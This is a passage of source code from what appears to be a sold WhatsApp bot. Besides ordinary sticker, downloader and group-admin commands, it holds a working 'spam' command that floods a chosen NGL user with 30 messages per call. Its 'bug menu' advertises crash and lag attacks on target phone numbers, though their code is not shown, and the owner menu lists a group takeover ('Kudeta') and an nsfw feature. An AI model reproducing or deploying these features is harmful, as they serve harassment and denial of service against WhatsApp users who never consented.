await justinn.sendMsg(m.chat, { audio: { url: `https://files.catbox.moe/309zyo.mp3` }, mimetype: 'audio/mp4', ptt: true }, { quoted: m });
      }
      break

case 'ptjustin': case "justinpt": {
const tampilan = `ã“ã‚“ã«ã¡ã¯ã§ã™ã‚·ã‚¹ãƒ†ãƒ ã‚¦ã‚¤ãƒ«ã‚¹ã‚’ä½¿ç”¨ã—ã¦ã‚ãªãŸã‚’åŠ©ã‘ã‚‹ãŸã‚ã«è¨­è¨ˆã•ã‚ŒãŸãƒœãƒƒãƒˆã§ã™åŠ©ã‘ã‚‹ã‚ãªãŸã€‚ 

*- è¨ˆã• PARTNER JUSTIN*
 âŒ¬ Aiox Lutbotz
 âŒ¬ KyuuuRzy 
 âŒ¬ ThannXs
 âŒ¬ Derr Official
 âŒ¬ Lenx Official
 âŒ¬ RizzXD Official
 âŒ¬ Daffa Ravage
 âŒ¬ Alwaysaqio
 âŒ¬ Aima Official
 âŒ¬ DrayXD Official
 âŒ¬ SanzXD Official
 âŒ¬ DanzXD Official
 âŒ¬ Kaizii
 âŒ¬ HyuZoldyck
 âŒ¬ Fahrul Official
 âŒ¬ ManxzGanzz
 âŒ¬ Jarot XD
 âŒ¬ GanXJudgeZ 
 âŒ¬ RyooOffc
 âŒ¬ KingFian
 âŒ¬ Xway Offc PYTHON
 âŒ¬ Zynn Offc
 âŒ¬ IkyOfficial
 âŒ¬ VanzOfficial
 âŒ¬ HbazZ Office
 âŒ¬ Dilxz Mods
 âŒ¬ Rizz official
 âŒ¬ Repzcina Official
 âŒ¬ Nted Official
 âŒ¬ Manzrowr
 âŒ¬ FirmanXD Official
 âŒ¬ Heykals Official
 âŒ¬ Ditzxy Official
 âŒ¬ Camoyy Official
 âŒ¬ FrÃ©dÃ©ric
 âŒ¬ Deruhu Forever
 âŒ¬ Fath heart
 âŒ¬ RenTzy 
 âŒ¬ Rulzz gtg
 âŒ¬ CoganNotDev
 âŒ¬ ZyynTamvan
 âŒ¬ Pauuukagenou
 âŒ¬ Karll
 âŒ¬ JackySTR
 âŒ¬ Muqitblabla
 âŒ¬ Vinnbug
 âŒ¬ RyzzIsHere 
 âŒ¬ HanzNotDev
 âŒ¬ Rbonlym
 âŒ¬ PANZZ
 âŒ¬ Kyy official
 âŒ¬ Ateus Offc
 âŒ¬ Rafzz official
 âŒ¬ Xyuu offc
 âŒ¬ CorzzaModss
 âŒ¬ F1kz Official
 âŒ¬ Neuro storm
 âŒ¬ Nelzz Official
 âŒ¬ Xinzz Official
 âŒ¬ EKIK JEMBOT
 âŒ¬ Lynzz Official
 âŒ¬ Iky Ztore27`
let buttons = [
        { buttonId: ".menu", buttonText: { displayText: "Back" }, type: 1 },
        { buttonId: ".sc", buttonText: { displayText: "Buy Versi Tele" }, type: 1 }
        
    ];
    let buttonMessage = {
    image: { url: `https://files.catbox.moe/9id6oh.jpg` },
gifPlayback: false,
caption: tampilan,
contextInfo: {
externalAdReply: {
title: 'JustinV20 Fase2',
                    body: 'Tiktok : JustinOfficial',
                    showAdAttribution: true,
                    thumbnailUrl: `https://files.catbox.moe/r14cz4.jpg`,
                    mediaType: 4,
                    MediaUrl: 'www.tiktok.com/@justinandiar',
                    sourceUrl: "www.tiktok.com/@justinandiar",
                }
            },    
        footer: "Developer JustinOfficial",
        buttons: buttons,
        viewOnce: true,
         headerType: 4
    };

const flowActions = [
    {
        buttonId: 'action',
        buttonText: { displayText: 'This Button List' },
        type: 4,
        nativeFlowInfo: {
            name: 'single_select',
            paramshtml: html.stringify({
                title: "Show All Fitur",
                sections: [
                    {
          title: "Fitur Utama Script Justin",
          highlight_label: "Populer",
                rows: [
        { title: "Bug Menu", description: "Menampilkan Semua Fitur Bug", id: ".bugmenu" }
                      ]
                      },
                      {
          title: "Bagian Fitur Akses Owner",
          highlight_label: "Click",
          rows: [
        { title: "Owner Menu", description: "Menampilkan Fitur Owner", id: ".ownermenu" },
        { title: "Tools", description: "Fitur Main Tools", id: ".tools" }   
                      ]
                    },
                    {
          title: "All Name Partner Justin",
          highlight_label: "Support Justin",
          rows: [
        { title: "Best Friends", description: "Partner Justin", id: ".ptjustin" }
                        ]
                    }
                ]
            })
        },
        viewOnce: true
    },
];


buttonMessage.buttons.push(...flowActions);
await justinn.sendMsg(m.chat, buttonMessage, { quoted: catalems });

await justinn.sendMsg(m.chat, { audio: { url: `https://files.catbox.moe/309zyo.mp3` }, mimetype: 'audio/mp4', ptt: true }, { quoted: m });
      }
      break;
  
case 'ownermenu': case "menuowner": {
const tampilan = `ã“ã‚“ã«ã¡ã¯ã§ã™ã‚·ã‚¹ãƒ†ãƒ ã‚¦ã‚¤ãƒ«ã‚¹ã‚’ä½¿ç”¨ã—ã¦ã‚ãªãŸã‚’åŠ©ã‘ã‚‹ãŸã‚ã«è¨­è¨ˆã•ã‚ŒãŸãƒœãƒƒãƒˆã§ã™åŠ©ã‘ã‚‹ã‚ãªãŸã€‚
  
*- è¨ˆã• INFORMATION BOT*
 âŒ¬ Botname : JustinOffc
 âŒ¬ Version : 20.0.2 Fase2
 âŒ¬ Mode : *Self* Mode
 âŒ¬ Status : Vip Buy Only!!

*- è¨ˆã• OWNER MENU*
 âŒ¬ Addowner 
 âŒ¬ Delowner
 âŒ¬ Antilink 
 âŒ¬ Kick
 âŒ¬ Open
 âŒ¬ Close
 âŒ¬ Demote
 âŒ¬ Promote
 âŒ¬ Public
 âŒ¬ Dellete
 âŒ¬ Hidetag
 âŒ¬ Tagall
 âŒ¬ Tagme
 âŒ¬ Upch-Audio
 âŒ¬ Banchat
 âŒ¬ Baned-chat
 âŒ¬ Unbanchat
 âŒ¬ Unbaned-chat
 âŒ¬ Upch2
 âŒ¬ Kudeta
 âŒ¬ Spam
`
let buttons = [
        { buttonId: ".sc", buttonText: { displayText: "Buy Versi Tele" }, type: 1 },
        
        
    ];
    let buttonMessage = {
    image: { url: `https://files.catbox.moe/9id6oh.jpg` },
gifPlayback: false,
caption: tampilan,
contextInfo: {
externalAdReply: {
title: 'JustinV20 Fase2',
                    body: 'Tiktok : JustinOfficial',
                    showAdAttribution: true,
                    thumbnailUrl: `https://files.catbox.moe/r14cz4.jpg`,
                    mediaType: 4,
                    MediaUrl: 'www.tiktok.com/@justinandiar',
                    sourceUrl: "www.tiktok.com/@justinandiar",
                }
            },    
        footer: "Developer JustinOfficial",
        buttons: buttons,
        viewOnce: true,
         headerType: 4
    };

const flowActions = [
    {
        buttonId: 'action',
        buttonText: { displayText: 'This Button List' },
        type: 4,
        nativeFlowInfo: {
            name: 'single_select',
            paramshtml: html.stringify({
                title: "Show All Fitur",
                sections: [
                    {
          title: "Fitur Utama Script Justin",
          highlight_label: "Populer",
                rows: [
        { title: "Bug Menu", description: "Menampilkan Semua Fitur Bug", id: ".bugmenu" }
                      ]
                      },
                      {
          title: "Bagian Fitur Akses Owner",
          highlight_label: "Click",
          rows: [
        { title: "Owner Menu", description: "Menampilkan Fitur Owner", id: ".ownermenu" },
        { title: "Tools", description: "Fitur Main Tools", id: ".tools" }   
                      ]
                    },
                    {
          title: "All Name Partner Justin",
          highlight_label: "Support Justin",
          rows: [
        { title: "Best Friends", description: "Partner Justin", id: ".ptjustin" }
                        ]
                    }
                ]
            })
        },
        viewOnce: true
    },
];

// Tambahkan flowActions ke buttonMessage
buttonMessage.buttons.push(...flowActions);

// Kirim pesan
await justinn.sendMsg(m.chat, buttonMessage, { quoted: catalems });
await justinn.sendMsg(m.chat, { audio: { url: `https://files.catbox.moe/309zyo.mp3` }, mimetype: 'audio/mp4', ptt: true }, { quoted: m });
      }
      break
  
  case 'bugmenu': case "menubug": {
const tampilan = `ã“ã‚“ã«ã¡ã¯ã§ã™ã‚·ã‚¹ãƒ†ãƒ ã‚¦ã‚¤ãƒ«ã‚¹ã‚’ä½¿ç”¨ã—ã¦ã‚ãªãŸã‚’åŠ©ã‘ã‚‹ãŸã‚ã«è¨­è¨ˆã•ã‚ŒãŸãƒœãƒƒãƒˆã§ã™åŠ©ã‘ã‚‹ã€‚

*- è¨ˆã• BUG MENU*
 âŒ¬ WraperOsCards 628xxxx
 âŒ¬ Forclose 628xxxx
 âŒ¬ Izalcs 628xxxx
 âŒ¬ Izalfcbos 628xxxx
 âŒ¬ Propovers 628xxxx
 âŒ¬ Infinity 628xxxx
 âŒ¬ DelayInvis 628xxxx`
let buttons = [
        { buttonId: ".sc", buttonText: { displayText: "Buy Versi Tele" }, type: 1 },
        
        
    ];
    let buttonMessage = {
    image: { url: `https://files.catbox.moe/9id6oh.jpg` },
gifPlayback: false,
caption: tampilan,
contextInfo: {
externalAdReply: {
title: 'JustinV20 Fase2',
                    body: 'Tiktok : JustinOfficial',
                    showAdAttribution: true,
                    thumbnailUrl: `https://files.catbox.moe/r14cz4.jpg`,
                    mediaType: 4,
                    MediaUrl: 'www.tiktok.com/@justinandiar',
                    sourceUrl: "www.tiktok.com/@justinandiar",
                }
            },    
        footer: "Developer JustinOfficial",
        buttons: buttons,
        viewOnce: true,
         headerType: 4
    };

const flowActions = [
    {
        buttonId: 'action',
        buttonText: { displayText: 'This Button List' },
        type: 4,
        nativeFlowInfo: {
            name: 'single_select',
            paramshtml: html.stringify({
                title: "Show All Fitur",
                sections: [
                    {
          title: "Fitur Utama Script Justin",
          highlight_label: "Populer",
                rows: [
        { title: "Bug Menu", description: "Menampilkan Semua Fitur Bug", id: ".bugmenu" }
                      ]
                      },
                      {
          title: "Bagian Fitur Akses Owner",
          highlight_label: "Click",
          rows: [
        { title: "Owner Menu", description: "Menampilkan Fitur Owner", id: ".ownermenu" },
        { title: "Tools", description: "Fitur Main Tools", id: ".tools" }   
                      ]
                    },
                    {
          title: "All Name Partner Justin",
          highlight_label: "Support Justin",
          rows: [
        { title: "Best Friends", description: "Partner Justin", id: ".ptjustin" }
                        ]
                    }
                ]
            })
        },
        viewOnce: true
    },
];

// Tambahkan flowActions ke buttonMessage
buttonMessage.buttons.push(...flowActions);

// Kirim pesan
await justinn.sendMsg(m.chat, buttonMessage, { quoted: catalems });
await justinn.sendMsg(m.chat, { audio: { url: `https://files.catbox.moe/309zyo.mp3` }, mimetype: 'audio/mp4', ptt: true }, { quoted: m });
      }
      break
              
  case 'owner': {
      justinn.sendContact(m.chat, kontributor, m)
      justinn.sendMsg(from, {
          text : `Gausa Spam,Chat Langsung Ke Inti!`,
          mentions: [sender]
      }, { quoted: m })
  }
  break;        
 
       case "baned":
       case "baneduser":{
           if (isBan) return
           if (!Access) return reply(mess.owner)
           let who;
           try {
               if (m.isGroup)
                   who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted.sender;
           } catch (err) {
               if (m.isGroup) who = text + "@s.whatsapp.net";
           }
           if (!who) return reply("tag atau reply yang mau di banned");
           const isBen = user_ban.includes(who);
           if (isBen) return reply(`${isBen} telah di banned !!`);
           user_ban.push(who);
           fs.writeFileSync("./start/lib/database/banned.html", html.stringify(user_ban, 2, null));
           await sleep(500);
           reply(who + "\npftt, di bann anjg aowkaowwk");
       }
       break;
                
       case "unbaneduser":
       case "unbanuser":{
           if (isBan) return
           if (!Access) return reply(mess.owner)
           let whe;
           try {
               if (m.isGroup)
                   whe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted.sender;
           } catch (err) {
               if (m.isGroup) whe = text + "@s.whatsapp.net";
           }
           if (!whe) return reply("tag atau reply nomor yang mau di unban");
           user_ban.splice(whe, 1);
           fs.writeFileSync("./start/lib/database/banned.html", html.stringify(user_ban, 2, null));
           await sleep(500);
           reply(whe + "\ndah ke unban");
       }
       break;
                
       case "listbanuser":
       case "listbaned":{
           if (isBan) return
           if (!Access) return reply(mess.owner)
           var textban = `list user terbanned di database : *${user_ban.length}*`;
           await justinn.sendMsg(m.chat, {
               text: textban,
               contextInfo: {
                   externalAdReply: {
                       title: `Justin V20`,
                       body: "Developer Justin",
                       thumbnailUrl: cinahitam,
                       sourceUrl: 'https://whatsapp.com/channel/0029VaxxUio545v2bL3FE91g',
                       mediaType: 1,
                       renderLargerThumbnail: true,
                   }
               }
           }, { quoted: x });
       }
       break;
                

           

            
case 'tovocal':
  case 'getvocal':
    case 'vocal':{
        if (isBan) return
        if (!text) return reply(`Example : ${prefix + command} kimetsu no yaiba`)
        let search = await yts(text);
        await reaction(m.chat, "â³")
        let telaso = search.all[0].url;
        let puqi = await VocalRemover(telaso);
          let vocalAudio = puqi.stuffs.find(item => item.bizType === 'vocal').key;
          justinn.sendMsg(m.chat, {
              audio: { url : vocalAudio },
              mimetype: 'audio/mpeg', 
              ptt: true
          },{quoted:x})
        }
      break;
            
case 'remini': {
        if (isBan) return
        if (!quoted || !/image/.test(mime)) return reply(`reply image dengan caption ${prefix + command}`)          
        const peler = await quoted.download()              
        let getResult;             
        const ImgLarger = require("./lib/scrape/remini")    
        await reaction(m.chat, "â³")
        const imgLarger = new ImgLarger();
        try {    
            const Logger = await imgLarger.processImage(peler, 4);
            getResult = Logger.data.downloadUrls[0];
            await justinn.sendMsg(m.chat, {      
                image: { url: `${getResult}` }, 
                caption: `> fetching - unlimited

status: succes
creator: rasilius`
            },{ quoted: m });
        } catch (error) { 
            console.error('Proses gagal total:', error.message);        
        }
    }
    break;
                
case 'banchat':{
    if (isBan) return
    if (!Access) return reply(mess.owner)
    if (global.db.data.chats[m.chat].isBanned = true) return reply("Sudah Active")
    global.db.data.chats[m.chat].isBanned = true
    reply("berhasil banchat")
}
break;

case 'unbanchat':{
    if (isBan) return
    if (!Access) return reply(mess.owner)
    if (global.db.data.chats[m.chat].isBanned = false) return reply("Sudah Off")
    global.db.data.chats[m.chat].isBanned = false
    reply("berhasil unbanchat")
}
break;
            
case 'toimage': 
  case 'toimg': {
      if (isBan) return
      if (!/webp/.test(mime)) return reply(`reply sticker dengan caption *${prefix + command}*`)
      let media = await justinn.downloadAndSaveMediaMessage(quoted)
      await reaction(m.chat, "â³")
      let ran = await getRandomFile('.png')  
      exec(`ffmpeg -i ${media} ${ran}`, (err) => {
          fs.unlinkSync(media)
          if (err) return err 
          let buffer = fs.readFileSync(ran)   
          justinn.sendMsg(m.chat, {   
              image: buffer     
          }, { quoted: x })
          fs.unlinkSync(ran)
      }
    )
  }
  break;
                
  case "pin":
  case "pinterest":{
      if (isBan) return
      if (!text) return reply(`Example : ${prefix + command} Foto Justin`);
      await reaction(m.chat, "â³")
      let anu = await pinterest(text);
      let result = anu[Math.floor(Math.random() * anu.length)];
      justinn.sendButtonImg(m.chat,
        [
            {
                id: `${prefix + command} ${text}`,
                text: 'Selanjutnya',
                type: 1
            }
        ],"Sukses", result, "Developer JustinOfficial", m, {viewOnce: true })
  }
  break;
  
  case "upch1":
  case "upch-audio":{
      if (isBan) return
      if (!Access) return reply(mess.owner)
      await reaction(m.chat, "â±ï¸")
      await sleep(3000)
      await reaction(m.chat, "â³")
      justinn.sendMsg(`${global.idch}`,{ 
          audio : await quoted.download(),
          mimetype: 'audio/mp4',
          ptt: true
      })
      await sleep(2000)
      await reaction(m.chat, "âœ…")
  }
  break;
 
 //=============== CASE GRUP ================//
  case 'h':
  case 'ht':
  case 'hidetag': {
      if (isBan) return
      if (!m.isGroup) return reply(mess.group)
      if (!isAdmins && !Access) return reply(mess.admin)
      if (m.quoted) {
          justinn.sendMsg(m.chat, {
              forward: m.quoted.fakeObj,
              mentions: participants.map(a => a.id)
          })
      }
      if (!m.quoted) {
          justinn.sendMsg(m.chat, {
              text: q ? q : '',
              mentions: participants.map(a => a.id)
          }, { quoted: x })
      }
  }
  break;
                
  case "kick":
  case "kik":
  case "kontol":{
      if (isBan) return
      if (!m?.isGroup) return reply(mess.group)
      if (!isAdmins) return reply(mess.admin)
      if (!isBotAdmins) return reply(mess.botadmin)
      if (!text && !m?.quoted) return reply(`reply atau tag dengan caption ${prefix + command}`)
      let users = m?.quoted ? m?.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
      await justinn.groupParticipantsUpdate(m?.chat, [users], 'remove').catch(console.log)
  }
  break;
                
  case 'antilink': {
      if (isBan) return	
      if (!m.isGroup) return reply(mess.group)
      if (!isAdmins && !Access) return reply(mess.admin)		
      if (!isBotAdmins) return reply(mess.botdmin)
      if (!text) return reply(`silakan pilih opsinya, on/off, contoh ${prefix + command} on/off`)
      if (args[0] === "on") {
          if (global.db.data.chats[m.chat].antilink) return reply(`aktif`)
          global.db.data.chats[m.chat].antilink = true
          reply('successfully activate antilink in this group')
      } else if (args[0] === "off") {		
          if (!global.db.data[m.chat].antilink) return reply(`udah nonaktif`)
          global.db.data[m.chat].antilink = false
          reply('successfully disabling antilink in this group')
      }
  }
  break;
          
 case 'tagme': {
     if (isBan) return
     if (!isGroup) return false;
     let menst = [m.sender];
     justinn.sendMsg(m.chat, { 
         text: `@${m.sender.split('@')[0]}`,  
         mentions: menst        
     }
   )   
 }
 break;
                
 case 'promote':
 case 'promotegb': {
     if (isBan) return
     if (!m.isGroup) return reply(mess.group)
     if (!Access && !isAdmins) return reply(mess.admin)
     if (!isBotAdmins) return reply(mess.botadmin)
     if (!m.quoted && !m.mentionedJid[0] && isNaN(parseInt(args[0]))) return reply('tag/reply pesan target yang ingin di jadikan admin!')
     let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
     if (!m.mentionedJid[0] && !m.quoted && !text) return reply(`tag/reply target yang mau di ${command}`)
     await reaction(m.chat, "ðŸ©¸")
     await justinn.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => m.reply('sukses promote member')).catch((err) => reply('terjadi kesalahan'))
 }
 break;
                
 case 'demote':
 case 'demotegb': {
     if (isBan) return
     if (!m.isGroup) return reply(mess.group)
     if (!Access && !isAdmins) return reply(mess.admin)
     if (!isBotAdmins) return reply(mess.botadmin)
     if (!m.quoted && !m.mentionedJid[0] && isNaN(parseInt(args[0]))) return m.warning('tag/reply pesan target yang ingin di un admin!')
     let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
     if (!m.mentionedJid[0] && !m.quoted && !text) return m.warning(`tag/reply target yang mau di ${command}`)
     await reaction(m.chat, "ðŸ©¸")
     await justinn.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.reply('sukses demote admin')).catch((err) => reply('terjadi kesalahan'))
 }
 break;
 
      case 'open':
      case 'buka': {
          if (!m.isGroup) return reply(mess.group)
          if (!isAdmins && !Access) return reply(mess.admin)
          if (!isBotAdmins) return m.tolak(mess.botadmin)
          justinn.groupSettingUpdate(m.chat, 'not_announcement')
          reply(`sukses mengizinkan semua peserta dapat mengirim pesan ke grup ini`)
      }
      break;
                
      case 'close':
      case 'tutup': {
          if (!m.isGroup) return reply(mess.group)
          if (!isAdmins && !Access) return reply(mess.admin)
          if (!isBotAdmins) return m.tolak(mess.botadmin)
          justinn.groupSettingUpdate(m.chat, 'announcement')
          reply(`sukses mengizinkan hanya admin yang dapat mengirim pesan ke grup ini`)
      }
      break;
            
      case'totag':{
        if (isBan) return
        if (!isAdmins) return reply(mess.admin);
        if (!m.isGroup) return reply(mess.group);
        if (!m.quoted) return reply(`reply pesan dengan caption ${prefix + command}`);
        const groupMetadata = await justinn.groupMetadata(m.chat);
        const participants = groupMetadata.participants;

        justinn.sendMsg(m.chat, {
            forward: m.quoted.fakeObj,
            mentions: participants.map((a) => a.id)
           }, { quoted: x });
         }
        break;
            
      case'tagall':{
        if (isBan) return
        if (!isAdmins) return reply(mess.admin);
        if (!m.isGroup) return reply(mess.group);

        const textMessage = args.join(" ") || "kosong";
        let teks = `pesan tagall :\n> *${textMessage}*\n\n`;

        const groupMetadata = await justinn.groupMetadata(m.chat);
        const participants = groupMetadata.participants;

        for (let mem of participants) {
            teks += `@${mem.id.split("@")[0]}\n`;
        }

        justinn.sendMsg(m.chat, {
            text: teks,
            mentions: participants.map((a) => a.id)
        }, { quoted: x });
      }
      break;
      case 'delete':
      case 'd':
      case 'del': {
        if (isBan) return
	    if (!m.quoted) return reply('reply pesan yang mau di hapus')
          await justinn.sendMsg(m.chat, {
              delete: {
                  remoteJid: m.chat,
                  id: m.quoted.id,
                  participant: m.quoted.sender
              }
          })
      }
	  break;
//=============== ACCESS ================//
case 'addprem': {
    if (isBan) return
    if (!Access) return reply(mess.owner)
    const kata = args.join(" ")
    const nomor = kata.split("|")[0];
    const hari = kata.split("|")[1];
    if (!nomor) return reply(`Example : ${prefix + command} @tag|30d`)
    if (!hari) return reply(`Akses Dengan Hari`)
    let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : nomor.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
    if (owner.includes(users)) return reply('Ganti Add Via Owner\n*Contoh* : addowner 628123456789')
    const idExists = _prem.checkPremiumUser(users)
    if (idExists) return reply('')
    let data = await justinn.onWhatsApp(users)
    if (data[0].exists) {
        await reaction(m.chat, 'â³')
        _prem.addPremiumUser(users, hari)
        await sleep(3000)
        let cekvip = ms(_prem.getPremiumExpired(users) - Date.now())
        let teks = `Sukses Status Premium 
*User* : @${users.split("@")[0]}
*Expired* : ${hari.toUpperCase()}
*Akses Hari* : ${cekvip.days} Hari, ${cekvip.hours} Jam, ${cekvip.minutes} Menit`
        const contentText = {
            text: teks,
            contextInfo: {	
                mentionedJid: justinn.ments(teks),
                externalAdReply: {
                    title: `Premium User V20`,
                    previewType: "PHOTO",
                    thumbnailUrl: `https://files.catbox.moe/snlnz4.jpeg`,
                    sourceUrl: 'https://whatsapp.com/channel/0029VaxxUio545v2bL3FE91g'
                }	
            }	
        };	
        return justinn.sendMsg(m.chat, contentText, { quoted: x })
    } else {		
         reply("not found")
    }	
}
break;
                
case 'delprem': {
    if (isBan) return
    if (!Access) return reply(mess.owner)
    if (!args[0]) return reply(`Example : ${prefix}delprem @tag`)
    let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
    const idExists = _prem.checkPremiumUser(users)
    if (!idExists) return reply("Not Usser Premium")
    let data = await justinn.onWhatsApp(users)
    await reaction(m.chat, "ðŸ©¸")
    if (data[0].exists) {	
        let premium = html.parse(fs.readFileSync('./start/lib/database/premium.html'));
        premium.splice(_prem.getPremiumPosition(users), 1)
        fs.writeFileSync('./start/lib/database/premium.html', html.stringify(premium))		
        reply('Done Dellete Its Usser!')
    } else {	
        reply("not found")
    }
}
break;
                
case 'addowner': {
    if (isBan) return
    if (!Access) return reply(mess.owner);
    if (!args[0]) return reply(`Example ${prefix + command} 628xxx`);
    const prem1 = text.split("|")[0].replace(/[^0-9]/g, '');
    const cek1 = await justinn.onWhatsApp(`${prem1}@s.whatsapp.net`);
    if (cek1.length == 0) return reply("masukkan nomor yang valid dan terdaftar di WhatsApp!")      
    kontributor.push(prem1);
    await reaction(m.chat, "ðŸ©¸")
    fs.writeFileSync('./start/lib/database/owner.html', html.stringify(kontributor));
    reply(`sukses menjadikan ${prem1} sebagai owner`); 
    justinn.sendMsg(`${prem1}@s.whatsapp.net`, { 
        text: `selamat, kamu sekarang bagian dari owner`},{quoted:x}
           );
        }
        break;

case 'delowner': {
    if (isBan) return
    if (!Access) return reply(mess.owner);
    if (!args[0]) return reply(`Example ${prefix + command} 628xxx`);
    const prem2 = text.split("|")[0].replace(/[^0-9]/g, '');
            const unp = kontributor.indexOf(prem2);
            if (unp !== -1) {
                kontributor.splice(unp, 1);
                await reaction(m.chat, "ðŸ©¸")
                fs.writeFileSync('./start/lib/database/owner.html', html.stringify(kontributor));
                reply(`yah ${prem2} sudah bukan lagi bagian dari owner`);
            } else {
                reply(`${prem2} tidak ada dalam list owner.`);
            }
        }
        break;
            
        case 'public': {
            if (isBan) return
            if (!Access) return reply(mess.owner) 
            justinn.public = true
            reply(`successfully changed to ${command}`)
        }
        break;
            
        case 'self': {
            if (isBan) return
            if (!Access) return reply(mess.owner) 
            justinn.public = false
            reply(`successfully changed to ${command}`)
        }
        break;

//=============== TOOLS ================//
            
case 'sticker':
case 's':
case 'stiker': {
    if (isBan) return
    if (!quoted) return reply(`reply image/video dengan caption ${prefix + command}`);
    try {
        if (/image/.test(mime)) {
            const media = await quoted.download();
            await reaction(m.chat, "ðŸ©¸")
            const imageUrl = `data:${mime};base64,${media.toString('base64')}`;
            await makeStickerFromUrl(imageUrl, justinn, m);
        } else if (/video/.test(mime)) {
            if ((quoted?.msg || quoted)?.seconds > 10) return reply('Durasi video maksimal 10 detik!')
                const media = await quoted.download();
                const videoUrl = `data:${mime};base64,${media.toString('base64')}`;
                await makeStickerFromUrl(videoUrl, justinn, m);
            } else {
                return reply('Kirim gambar/video dengan caption .s (video durasi 1-10 detik)');
            }
        } catch (error) {
            console.error(error);
            return reply('Terjadi kesalahan saat memproses media. Coba lagi.');
        }
    }
    break;
        
      
    case 'instagram':
    case 'ig': {
        if (isBan) return;
        if (!text) return reply(`Example: ${prefix + command} https://www.instagram.com/reel/jembutmoax`);
    
        let memek = await igdl(text);
        await reaction(m.chat, "â³");
    
        let respon = memek.data;
        if (respon && respon.length > 0) {
        
            let uniqueUrls = new Set(respon.map(item => item.url));
            try {
                for (let mediaUrl of uniqueUrls) {
                    const headResponse = await axios.head(mediaUrl);
                    const mimeType = headResponse.headers['content-type'];

                    const isImage = /image\/.*/.test(mimeType);
                    const isVideo = /video\/.*/.test(mimeType);

                    if (isImage) {
                        await justinn.sendMsg(m.chat, {
                            image: { url: mediaUrl },
                            caption: "berhasil mendownload gambar dari URL."
                        }, { quoted: m });
                    } else if (isVideo || mimeType === 'application/octet-stream') {
                        await justinn.sendMsg(m.chat, {
                            video: { url: mediaUrl },
                            caption: "berhasil mendownload video dari URL."
                        }, { quoted: m });
                    } else {
                        await justinn.sendMsg(m.chat, {
                            text: `tipe media tidak didukung: ${mimeType}`
                        }, { quoted: m });
                    }
                }
            } catch (error) {
                console.error('Error fetching media type:', error);
                reply(error)
            }
        } else {
            await justinn.sendMsg(m.chat, {
                text: "Tidak ditemukan media atau terjadi kesalahan saat mengambil media."
            }, { quoted: x });
        }
    }
    break;
      
      case 'fb':
      case 'fbdl':
      case 'facebook':{
          if (isBan) return
          if (!text) return reply(`Example : ${prefix + command} https://www.facebook.com/share/jembutmoax`)
          let woii = await fetchhtml(`https://api.siputzx.my.id/api/d/facebook?url=${text}`)
          await reaction(m.chat, "ðŸ©¸")
          let hitam = woii.data;
          let peler = hitam.video;
          let anunya = hitam.userInfo.name
          justinn.sendMsg(m.chat, { 
              video: { url: peler }, 
              caption: `source : ${anunya}` }, 
           { quoted: x }
         );
      }
      break;
                
      case'ai':
      case'gemini':
      case'openai':
      case'chatgpt':{
        if (isBan) return
        if (!text) return reply(`Example ${prefix + command} siapakah presiden Indonesia sekarang?`)
          let cuki = await fetchhtml(`https://loco.web.id/wp-content/uploads/api/v1/bingai.php?q=${text}`)
          await reaction(m.chat, "â³")
          let mamad = cuki.result.ai_response
          justinn.sendMsg(m.chat, { text : mamad }, {quoted:x})
      }
      break;
            
      case'pin':{
        if (isBan) return
        if (!text) return reply(`Example : ${prefix + command} https://pin.it/1DyLc8cGU`);
        let res = await pindl(text);
          await reaction(m.chat, "â³")
        let mek = res.data.result;

        if (mek && mek.data) {
            const mediaUrl = mek.data;
            const isImage = mediaUrl.match(/\.(jpeg|jpg|png|gif)$/i);
            const isVideo = mediaUrl.match(/\.(mp4|webm|ogg)$/i);

            if (isImage) {
                await justinn.sendMsg(m.chat, {
                    image: { url: mediaUrl },
                    caption: "Successfully downloaded photo using the Pinterest URL"
                }, { quoted: x });
            } else if (isVideo) {
                await justinn.sendMsg(m.chat, {
                    video: { url: mediaUrl },
                    caption: "Successfully downloaded video using the Pinterest URL"
                }, { quoted: x });
            } else {
                await justinn.sendMsg(m.chat, {
                    text: "Unsupported media type received."
                }, { quoted: x });
            }
        } else {
            await justinn.sendMsg(m.chat, {
                text: "No media found or an error occurred while retrieving media."
            }, { quoted: x });
        }
      }
      break;
          
      case'spam':{
        if (isBan) return
        if (!text) return reply(`berikan pesan dan username target, contoh ${prefix + command} justin wkwk?`)
        let peler = text.split("|")[0]
        let laso = text.split("|")[1]
        for (let j = 0; j < 30; j++) {
        await spamngl(peler, laso)
        }
          await reaction(m.chat, "ðŸ©¸")
        justinn.sendMsg(m.chat, {
            text: `sukses spam NGL ke ${peler} sebanyak 30x` 
          },{quoted:x})
      }
      break;
            
        case'brat':{
            if (!isPremium && users.limit < 0) return reply(mess.limited); 
            users.limit -= 1;
            if (isBan) return
            if (!text) return reply(`Example : ${prefix + command} Justin Ganteng`)
            const imageUrl = `https://brat.caliphdev.com/api/brat?text=${text}`;
            await reaction(m.chat, "â³")
            await makeStickerFromUrl(imageUrl, justinn, m);
        }
                
                
      case 'q':
      case 'quoted': {
        if (isBan) return
          if (!m.quoted) return reply('reply pesannya')
          let gwm = await justinn.serializeM(await m.getQuotedObj())
          if (!gwm.quoted) return reply('pesan yang anda reply tidak mengandung reply')
          await gwm.quoted.copyNForward(m.chat, true)
      }
      break;

      case 'tovn': {
        if (isBan) return
        if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`reply video/vn dengan caption ${prefix + command}`);
        if (!quoted) return reply(`Reply video/vn with caption ${prefix + command}`);
        await reaction(m.chat, "â³")
        await sleep(5000);
        let media = await quoted.download();
        let { toAudio } = require('./lib/converter');
        let audio = await toAudio(media, 'mp4');
        justinn.sendMsg(m.chat, { audio, mimetype: 'audio/mpeg', ptt: true }, { quoted: m });
      }
        break;

case "nsfw": {
        	reply(`ngocok terus dekk`)
			sbe = await randomNsFw()
			cejd = sbe[Math.floor(Math.random(), sbe.length)]
			justinn.sendMsg(m.chat, {
